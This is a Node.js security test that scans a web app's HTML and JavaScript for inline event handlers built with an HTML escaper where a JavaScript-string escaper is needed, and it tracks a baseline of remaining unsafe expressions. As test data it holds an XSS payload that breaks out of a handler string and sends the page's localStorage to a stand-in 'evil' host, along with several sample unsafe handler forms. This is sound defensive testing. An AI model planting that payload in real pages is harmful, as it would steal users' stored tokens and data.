// e2e/guard-xss-handlers.cjs — SEC-FIX2 H4: no inline handler is built from `esc(x).replace(/'/g, …)` (esc turns ' into &#39;, which the
// browser decodes BEFORE the handler runs, so the replace never matches and the text breaks out of the string), and the public network
// store builds its category chips from data-cat + one listener. Offline: reads source, runs esc on the review's payload.
'use strict';
const fs = require('fs'), path = require('path');
const root = path.join(__dirname, '..', 'public');
let fail = 0;
const t = (name, ok, why) => { console.log((ok ? '  ok  ' : '  FAIL') + ' ' + name + (ok ? '' : ' — ' + (why || ''))); if (!ok) fail++; };
const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap((e) => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
const wrongOrder = /esc\([^()]*(?:\([^()]*\))?[^()]*\)\.replace\(\/'\/g/;
const hits = walk(root).filter((f) => /\.(html|js)$/.test(f))
  .flatMap((f) => fs.readFileSync(f, 'utf8').split('\n').map((l, i) => wrongOrder.test(l) ? path.relative(root, f) + ':' + (i + 1) : null).filter(Boolean));
t('no esc(x).replace(/\'/g, …) inside an inline handler (quote escaped AFTER esc)', hits.length === 0, hits.join(', '));
const store = fs.readFileSync(path.join(root, 'store.html'), 'utf8');
t('store.html chips carry data-cat and no setCat( handler string', /data-cat="' \+ esc\(\w+\)/.test(store) && !/onclick="setCat\(/.test(store));
t('store.html reads the chip back through one click listener', /getElementById\('cats'\)\.addEventListener\('click'/.test(store));
const esc = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + '; return esc;')();
const payload = "x');fetch('//evil/?'+btoa(JSON.stringify(localStorage)));//";
t('the review\'s payload stays inside a data-cat attribute (no raw quote survives esc)', !/['"<>]/.test(esc(payload).replace(/&#39;|&quot;|&lt;|&gt;|&amp;/g, '')));
/* reviews5 (GF-03 M8 · GF-05 M10 · EL-04 M14): esc() INSIDE a quoted JS argument of an inline handler. The browser decodes &#39; to ' before the
   JS runs, so a value with a quote ends the string and the rest runs. The argument goes through escJs (helpers.js). Allowed leftover: the till
   copy (vendored, the api master owns it), (this list only shrinks). */
const inHandlerArg = /[(,]\s*(?:\\'['"]|'")\s*\+\s*esc\(/g;
const allowLeft = /^(till.html)$/;
const leaks = walk(root).filter((f) => /\.(html|js)$/.test(f) && !allowLeft.test(path.relative(root, f)))
  .flatMap((f) => { const src = fs.readFileSync(f, 'utf8'); const out = []; let m; while ((m = inHandlerArg.exec(src))) out.push(path.relative(root, f) + ':' + (src.slice(0, m.index).split('\n').length)); return out; });
t('no esc( inside a quoted JS argument of an inline handler (use escJs)', leaks.length === 0, leaks.slice(0, 8).join(', ') + (leaks.length > 8 ? ' … ' + leaks.length : ''));
/* reviews7: the regex above needs "(" or "," before the quote; the scan below rebuilds the handler from the concatenation and finds EVERY form
   (ontoggle="X[\'' + esc(k) …, ="_ARMED=\'rm:' + esc(id) …, template literals). */
const { scanHandlerEsc } = require('./lib/handler-esc-scan.cjs');
const leaks2 = walk(root).filter((f) => /\.(html|js)$/.test(f) && !allowLeft.test(path.relative(root, f)))
  .flatMap((f) => scanHandlerEsc(fs.readFileSync(f, 'utf8')).map((h) => path.relative(root, f) + ':' + h.line));
t('no esc( inside a single-quoted JS string of ANY inline handler, any concatenation form (use escJs)', leaks2.length === 0, leaks2.slice(0, 8).join(', ') + (leaks2.length > 8 ? ' … ' + leaks2.length : ''));
const forms = [
  "' ontoggle=\"S[\\'' + esc(k) + '\\']=1\"'", "'<b onclick=\"go(\\'' + esc(k) + '\\')\">'", "' onclick=\"A=\\'rm:' + esc(k) + '\\'\"'",
  "`<b onclick=\"go('${esc(k)}')\">`", "'<b onclick=\"go(\\'' + escJs(k) + '\\')\">'"
];
t('the scan finds the four unsafe forms and passes the escJs one', forms.map((s) => scanHandlerEsc(s).length).join('') === '11110', forms.map((s) => scanHandlerEsc(s).length).join(''));
const escJs = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function escJs\(v\)[\s\S]*?\n\}/)[0] + '; return escJs;')();
const attr = escJs(payload);
const decoded = attr.replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
t('escJs: the payload decoded as the browser does stays one string (no quote or backslash survives)', !/['"<>]/.test(decoded));
t('escJs: the string value round-trips', new Function('return \'' + decoded + '\'')() === payload);
/* p1new-1130 (GF-app-html-r3#L30 · L-sec-web-screens-11#L24): the two P1s slipped past every guard above. One put a name in a handler through
   escJs(a) + "','" + String(name).replace(...) (a second quote kind between the pieces), the other wrote  netAvailToggle(\'' + (newline) + item.key  (a
   concatenation over several lines, and the line-based guards read one line). The scan now follows both, and reports EVERY expression in a quoted handler
   string that is not escJs / cbAttachSafe ("raw"). The ones that exist today are ids and fixed keys the developer wrote, counted per file in
   e2e/fixtures/inline-handler-raw-multiline.json; this list only shrinks: a NEW raw expression fails. Use data-x="${esc(v)}" onclick="f(this.dataset.x)" or escJs(v).
   Regenerate only to LOWER it: GEN_XSS_RAW=1 node e2e/guard-xss-handlers.cjs */
const RAWFIX = path.join(__dirname, 'fixtures', 'inline-handler-raw-multiline.json');
const rawNow = {};
walk(root).filter((f) => /\.(html|js)$/.test(f) && !allowLeft.test(path.relative(root, f))).forEach((f) => {
  scanHandlerEsc(fs.readFileSync(f, 'utf8'), { raw: true }).forEach((h) => {
    const rel = path.relative(root, f).split(path.sep).join('/'), key = h.expr.replace(/\s+/g, ' ').slice(0, 60);
    (rawNow[rel] = rawNow[rel] || {})[key] = ((rawNow[rel] || {})[key] || 0) + 1;
  });
});
if (process.env.GEN_XSS_RAW) fs.writeFileSync(RAWFIX, JSON.stringify(rawNow, null, 1) + '\n');
const rawBase = JSON.parse(fs.readFileSync(RAWFIX, 'utf8'));
const rawNew = [];
Object.keys(rawNow).forEach((f) => Object.keys(rawNow[f]).forEach((k) => { if (rawNow[f][k] > ((rawBase[f] || {})[k] || 0)) rawNew.push(f + '  ' + k + ' (' + rawNow[f][k] + ' > ' + ((rawBase[f] || {})[k] || 0) + ')'); }));
t('no NEW raw expression inside a quoted JS string of an inline handler, over several lines or mixed quotes (escJs, or data-x + this.dataset.x)', rawNew.length === 0, rawNew.slice(0, 8).join('; '));
const p1forms = [
  `'<b onclick="go(\\'' + escJs(a) + "','" + String(n).replace(/[\\\\']/g, '') + '\\')">'`,
  `'<b onclick="netAvailToggle(\\'' +\n  item.key +\n  '\\')">'`,
  `'<b onclick="go(\\'' + escJs(a) + "','" + escJs(n) + '\\')">'`,
  `'<b data-n="' + esc(n) + '" onclick="go(this.dataset.n)">'`
];
t('the raw scan finds the mixed-quote and the multi-line forms and passes escJs and data-*', p1forms.map((s) => scanHandlerEsc(s, { raw: true }).length).join('') === '1100', p1forms.map((s) => scanHandlerEsc(s, { raw: true }).length).join(''));
process.exit(fail ? 1 : 0);
